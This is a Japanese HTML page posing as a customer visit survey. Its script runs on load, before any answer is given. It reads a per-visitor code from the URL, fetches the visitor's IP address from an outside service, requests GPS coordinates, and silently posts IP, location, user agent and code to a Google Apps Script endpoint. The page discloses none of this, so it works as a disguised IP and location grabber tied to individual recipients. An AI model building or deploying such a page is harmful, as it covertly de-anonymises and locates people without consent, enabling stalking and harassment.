<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>アンケートページ</title>
<style>
body { font-family: sans-serif; margin: 40px; }
h1 { color: #3366cc; }
fieldset { margin-bottom: 1em; }
button { padding: 8px 16px; font-size: 1em; }
</style>
</head>
<body>
<h1>ご来店アンケート</h1>

<form id="form">
  <fieldset>
    <legend>Q1. 本日の満足度をお聞かせください</legend>
    <label><input type="radio" name="q1" value="満足"> 満足</label>
    <label><input type="radio" name="q1" value="普通"> 普通</label>
    <label><input type="radio" name="q1" value="不満"> 不満</label>
  </fieldset>

  <fieldset>
    <legend>Q2. スタッフの対応はいかがでしたか？</legend>
    <label><input type="radio" name="q2" value="良い"> 良い</label>
    <label><input type="radio" name="q2" value="普通"> 普通</label>
    <label><input type="radio" name="q2" value="悪い"> 悪い</label>
  </fieldset>

  <fieldset>
    <legend>Q3. ご意見・ご感想（任意）</legend>
    <textarea name="q3" rows="3" cols="40"></textarea>
  </fieldset>

  <button type="submit">送信</button>
</form>

<script>
const GAS_URL = "https://script.google.com/macros/s/AKfycby8qwz4PJgtCwA3c_seK6Qulf_rS5u5qUer6MpKaFVLp7inShArUOwRWky0s9KykyyF9A/exec";

// URL末尾のパラメータ（例: ?12345）からコードを取得
const params = new URLSearchParams(window.location.search);
const code = [...params.keys()][0] || "";

// 🔍 IPアドレスを外部APIから取得
fetch("https://api.ipify.org?format=json")
  .then(res => res.json())
  .then(ipData => {
    // 📍 GPS位置情報を取得
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(pos => {
        sendAccess(ipData.ip, pos.coords.latitude, pos.coords.longitude);
      }, err => {
        // 位置情報取得失敗時
        sendAccess(ipData.ip, "", "");
      });
    } else {
      sendAccess(ipData.ip, "", "");
    }
  })
  .catch(() => sendAccess("", "", ""));

// ✅ アクセス記録送信
function sendAccess(ip, lat, lng) {
  fetch(GAS_URL, {
    method: "POST",
    body: JSON.stringify({
      type: "access",
      code: code,
      ua: navigator.userAgent,
      ip: ip,
      lat: lat,
      lng: lng
    })
  });
}

// ✅ アンケート送信
document.getElementById("form").addEventListener("submit", async e => {
  e.preventDefault();
  const q1 = document.querySelector('input[name="q1"]:checked')?.value || "";
  const q2 = document.querySelector('input[name="q2"]:checked')?.value || "";
  const q3 = document.querySelector('textarea[name="q3"]').value || "";

  if (!q1 || !q2) {
    alert("全ての質問に回答してください。");
    return;
  }

  await fetch(GAS_URL, {
    method: "POST",
    body: JSON.stringify({
      type: "survey",
      code: code,
      answers: [q1, q2, q3]
    })
  });

  alert("ご回答ありがとうございました！");
  document.getElementById("form").reset();
});
</script>
</body>
</html>
